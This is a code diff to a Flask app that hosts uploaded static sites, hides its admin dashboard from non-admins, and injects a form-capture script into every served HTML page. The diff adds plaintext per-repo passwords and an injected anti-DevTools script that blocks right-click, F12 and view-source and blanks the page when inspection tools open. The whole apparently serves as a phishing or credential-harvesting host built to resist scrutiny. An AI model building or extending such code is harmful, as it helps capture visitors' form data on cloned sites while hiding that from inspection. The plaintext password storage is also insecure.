@@ -1,9 +1,8 @@
 """
 Socialize — repo host + form capture + file manager.
 Can host full static sites (like PH3D) from uploaded ZIPs.
-`/` and admin routes return 404 for non-admins (dashboard is hidden).
-Admin pages carry <meta name="robots" content="noindex, nofollow">.
-Public repo pages stay indexable.
+Admin routes return 404 for non-admins. Admin pages carry noindex.
+Per-repo password protection. Anti-DevTools script injection.
 """
 import os, io, json, zipfile, mimetypes, html as html_mod
 from datetime import datetime
@@ -52,6 +51,7 @@ class Repo(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     slug = db.Column(db.String(100), unique=True, nullable=False, index=True)
     name = db.Column(db.String(200), nullable=False)
+    password = db.Column(db.String(200), nullable=True)   # NEW: per-repo password
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
 
 class File(db.Model):
@@ -101,11 +101,18 @@ def admin_required(f, hide=False):
     return w
 
 def admin_hidden(f):
-    """Like admin_required, but returns 404 instead of redirecting to login."""
     return admin_required(f, hide=True)
 
 def get_repo(slug):
     return Repo.query.filter(func.lower(Repo.slug) == slug.lower()).first()
+
+def repo_unlocked(repo):
+    """True if admin, or repo has no password, or user has entered correct password."""
+    if is_admin():
+        return True
+    if not repo.password:
+        return True
+    return session.get(f"repo_unlocked_{repo.id}") is True
 
 def phone_download_dir():
     for c in ("/storage/emulated/0/Download", "/sdcard/Download",
@@ -155,6 +162,48 @@ def delete_cloudinary_file(public_id):
     except Exception:
         pass
 
+# ---------------- anti-devtools script ----------------
+_ANTI_DEVTOOLS_JS = """
+<script>
+(function(){
+  // Block right-click
+  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+
+  // Block F12, Ctrl+Shift+I/J/C, Ctrl+U (view source)
+  document.addEventListener('keydown', function(e){
+    if (e.key === 'F12' ||
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+        (e.ctrlKey && e.key === 'U') ||
+        (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'J' || e.key === 'C'))) {
+      e.preventDefault();
+      e.stopPropagation();
+      return false;
+    }
+  });
+
+  // Detect DevTools open and hide content
+  var devtoolsOpen = false;
+  var threshold = 160;
+  setInterval(function(){
+    var wDiff = window.outerWidth  - window.innerWidth  > threshold;
+    var hDiff = window.outerHeight - window.innerHeight > threshold;
+    if (wDiff || hDiff) {
+      if (!devtoolsOpen) {
+        devtoolsOpen = true;
+        try {
+          document.body.innerHTML = '<div style="position:fixed;inset:0;background:#000;color:#f55;display:flex;align-items:center;justify-content:center;font-family:sans-serif;font-size:18px;z-index:999999">Close DevTools to continue</div>';
+        } catch(e){}
+      }
+    } else if (devtoolsOpen) {
+      devtoolsOpen = false;
+      location.reload();
+    }
+  }, 500);
+})();
+</script>
+"""
+
+# ---------------- capture script ----------------
 _CAPTURE_JS = """
 <script>
 (function(){
@@ -182,12 +231,16 @@ _CAPTURE_JS = """
 </script>
 """
 
-def inject_capture(html_text, slug):
+def inject_capture(html_text, slug, anti_devtools=True):
+    """Inject anti-devtools + form-capture scripts into HTML before </body>."""
     if not html_text: return html_text
-    script = _CAPTURE_JS.replace("__SLUG__", slug)
+    combined = ""
+    if anti_devtools:
+        combined += _ANTI_DEVTOOLS_JS
+    combined += _CAPTURE_JS.replace("__SLUG__", slug)
     if "</body>" in html_text:
-        return html_text.replace("</body>", script + "</body>", 1)
-    return html_text + script
+        return html_text.replace("</body>", combined + "</body>", 1)
+    return html_text + combined
 
 # ---------------- CSS ----------------
 CSS = """<style>
@@ -211,6 +264,9 @@ td,th{padding:10px;text-align:left;border-bottom:1px solid var(--border);font-si
 th{color:var(--muted);font-size:12px;text-transform:uppercase}
 .flash{padding:12px;background:#1e3a5f;border-radius:8px;margin-bottom:16px;border-left:4px solid var(--accent)}
 pre{margin:0;font-size:12px;overflow:auto;max-height:220px;background:#0b1220;padding:8px;border-radius:6px;white-space:pre-wrap;word-break:break-word}
+.badge{padding:3px 8px;border-radius:6px;font-size:11px;font-weight:700;letter-spacing:.05em}
+.badge.lock{background:#7c2d12;color:#fed7aa}
+.badge.open{background:#14532d;color:#bbf7d0}
 @media (max-width:640px){
   .row{flex-direction:column;align-items:stretch}
   .row input,.row button{width:100%}
@@ -270,8 +326,9 @@ def dashboard():
         for r in repos:
             nf = File.query.filter_by(repo_id=r.id, is_dir=False).count()
             ns = Submission.query.filter_by(repo_id=r.id).count()
+            lock_badge = '<span class="badge lock">🔒</span>' if r.password else '<span class="badge open">public</span>'
             repo_rows += f"""<tr>
-              <td><a href="/{esc(r.slug)}" target="_blank"><strong>{esc(r.slug)}</strong></a></td>
+              <td><a href="/{esc(r.slug)}" target="_blank"><strong>{esc(r.slug)}</strong></a> {lock_badge}</td>
               <td>{nf}</td><td>{ns}</td>
               <td>
                 <a href="/_manage/{esc(r.slug)}">Manage</a> ·
@@ -325,9 +382,10 @@ def dashboard():
       <h2>Create repository</h2>
       <form method="post" action="/repos/new" class="row">
         <input name="slug" placeholder="slug (e.g. Ph3d)" required>
+        <input name="password" placeholder="optional password (leave empty = public)">
         <button type="submit">Create</button>
       </form>
-      <p class="muted">Then upload a ZIP from the manage page. A top-level wrapper folder is stripped automatically.</p>
+      <p class="muted">A repo password makes visitors enter it before the site loads. Empty = public site. A top-level wrapper folder in uploaded ZIPs is stripped automatically.</p>
     </div>
     <div class="card">
       <h2>Repositories ({len(repos)})</h2>
@@ -375,15 +433,27 @@ def clear_submissions():
 @admin_required
 def new_repo():
     slug = (request.form.get("slug") or "").strip()
+    password = (request.form.get("password") or "").strip() or None
     if not slug or "/" in slug or slug.startswith("_"):
         flash("Invalid slug")
         return redirect(url_for("dashboard"))
     if get_repo(slug):
         flash("Slug already exists")
         return redirect(url_for("dashboard"))
-    db.session.add(Repo(slug=slug, name=slug))
+    db.session.add(Repo(slug=slug, name=slug, password=password))
     db.session.commit()
-    flash(f"Created repo: {slug}")
+    flash(f"Created repo: {slug}" + (" (password protected)" if password else ""))
+    return redirect(url_for("manage_files", slug=slug))
+
+@app.route("/repos/<slug>/set-password", methods=["POST"])
+@admin_required
+def set_repo_password(slug):
+    r = get_repo(slug)
+    if not r: abort(404)
+    new_pw = (request.form.get("password") or "").strip() or None
+    r.password = new_pw
+    db.session.commit()
+    flash("Password updated" if new_pw else "Password removed — repo is now public")
     return redirect(url_for("manage_files", slug=slug))
 
 @app.route("/repos/<slug>/delete", methods=["POST"])
@@ -400,6 +470,32 @@ def delete_repo(slug):
         flash(f"Deleted repo: {slug}")
     return redirect(url_for("dashboard"))
 
+# ---------------- repo unlock ----------------
+@app.route("/<slug>/unlock", methods=["GET", "POST"])
+def repo_unlock(slug):
+    repo = get_repo(slug)
+    if not repo: abort(404)
+    if not repo.password:
+        return redirect(url_for("serve_index", slug=repo.slug))
+    error = None
+    if request.method == "POST":
+        if request.form.get("password") == repo.password:
+            session[f"repo_unlocked_{repo.id}"] = True
+            return redirect(url_for("serve_index", slug=repo.slug))
+        error = "Incorrect password"
+    body = f"""
+    <div class="card" style="max-width:400px;margin:60px auto">
+      <h2>🔒 {esc(repo.slug)} is protected</h2>
+      <p class="muted">Enter the password to view this site.</p>
+      {f'<p style="color:var(--danger)">{esc(error)}</p>' if error else ''}
+      <form method="post">
+        <input type="password" name="password" placeholder="Repo password" required autofocus>
+        <div style="height:12px"></div>
+        <button type="submit">Unlock</button>
+      </form>
+    </div>"""
+    return page(repo.slug, body, noindex=True)
+
 # ---------------- file serving ----------------
 def _serve_file(f, repo):
     if f.is_binary and f.cloud_url:
@@ -409,7 +505,7 @@ def _serve_file(f, repo):
     content = f.content or ""
 
     if path_lower.endswith((".html", ".htm")):
-        content = inject_capture(content, repo.slug)
+        content = inject_capture(content, repo.slug, anti_devtools=True)
         return content, 200, {"Content-Type": "text/html; charset=utf-8"}
 
     if path_lower.endswith((".js", ".mjs")):
@@ -441,6 +537,8 @@ def _serve_file(f, repo):
 def serve_index(slug):
     repo = get_repo(slug)
     if not repo: abort(404)
+    if not repo_unlocked(repo):
+        return redirect(url_for("repo_unlock", slug=repo.slug))
     f = File.query.filter_by(repo_id=repo.id, path="index.html").first()
     if f: return _serve_file(f, repo)
     f = File.query.filter(File.repo_id == repo.id, File.path.like("%/index.html")).first()
@@ -452,6 +550,8 @@ def serve_index(slug):
 def serve_path(slug, filepath):
     repo = get_repo(slug)
     if not repo: abort(404)
+    if not repo_unlocked(repo):
+        return redirect(url_for("repo_unlock", slug=repo.slug))
     f = File.query.filter_by(repo_id=repo.id, path=filepath).first()
     if f:
         return _serve_file(f, repo)
@@ -500,12 +600,23 @@ def manage_files(slug):
     if not files:
         rows = '<tr><td colspan="5" class="muted">No files. Upload a ZIP or create one.</td></tr>'
 
+    pw_section = f"""
+    <div class="card">
+      <h2>🔒 Password protection</h2>
+      <p class="muted">Current: {'<span class="badge lock">PROTECTED</span>' if repo.password else '<span class="badge open">PUBLIC</span>'}</p>
+      <form method="post" action="/repos/{esc(repo.slug)}/set-password" class="row">
+        <input type="text" name="password" placeholder="New password (empty = remove)">
+        <button type="submit">Update</button>
+      </form>
+    </div>"""
+
     body = f"""
     {_flash_html()}
     <div class="card">
       <h2>{esc(repo.slug)} · File Manager</h2>
       <p class="muted">Public URL: <a href="/{esc(repo.slug)}" target="_blank">/{esc(repo.slug)}</a></p>
     </div>
+    {pw_section}
     <div class="card">
       <h2>Upload ZIP</h2>
       <form method="post" action="/_manage/{esc(repo.slug)}/upload" enctype="multipart/form-data" class="row">
